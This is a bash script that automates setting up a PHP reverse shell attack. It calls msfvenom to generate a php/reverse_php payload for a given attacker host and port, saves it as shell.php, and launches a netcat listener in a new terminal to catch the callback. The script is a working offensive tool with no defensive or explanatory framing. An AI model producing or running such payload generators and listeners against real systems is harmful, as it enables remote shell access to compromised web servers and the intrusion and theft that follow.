#!/bin/bash

if [ "$#" -ne 2 ] && [ "$#" -ne 3 ]; then
    echo "[i] Usage: $0 <LHOST> <LPORT> [--no-listen]"
    exit 1
fi

LHOST="$1"
LPORT="$2"
OUTPUT_FILE="shell.php"
NO_LISTEN=0

if [ "$3" == "--no-listen" ]; then
    NO_LISTEN=1
fi

if ! command -v msfvenom &> /dev/null; then
    echo "[x] Error: msfvenom is not installed or not in PATH."
    exit 1
fi

if ! command -v nc &> /dev/null; then
    echo "[x] Error: netcat (nc) is not installed."
    exit 1
fi

echo "[*] Generating PHP reverse shell..."
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > "$OUTPUT_FILE"

if [ -f "$OUTPUT_FILE" ]; then
    echo "[+] Payload saved as $OUTPUT_FILE"
else
    echo "[-] Failed to create payload."
    exit 1
fi

if [ "$NO_LISTEN" -eq 0 ]; then
    if command -v mate-terminal &>/dev/null; then
        TERMINAL="mate-terminal"
    elif command -v xfce4-terminal &>/dev/null; then
        TERMINAL="xfce4-terminal"
    elif command -v gnome-terminal &>/dev/null; then
        TERMINAL="gnome-terminal"
    else
        echo "[x] No supported terminal emulator found (mate-terminal, xfce4-terminal, gnome-terminal)."
        exit 1
    fi

    echo "[*] Launching netcat listener on port $LPORT in a new terminal..."
    $TERMINAL -- bash -c "echo '[*] Listening on port $LPORT...'; nc -lvnp $LPORT; exec bash"
else
    echo "[i] Listener skipped (--no-listen was provided)."
fi